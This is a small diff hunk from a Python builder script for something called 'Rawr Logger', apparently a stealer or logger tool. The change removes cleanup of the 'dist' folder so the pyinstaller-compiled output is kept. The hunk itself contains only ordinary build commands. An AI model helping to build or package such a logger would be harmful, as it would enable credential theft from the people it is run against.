@@ -57,7 +57,6 @@ elif prot == 'n':
     if compile == "y":
       os.system(f"pyinstaller --onefile {name}.py")
       shutil.rmtree('build')
-      shutil.rmtree('dist')
       os.remove(f'{name}.spec')
       Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
       time.sleep(2)
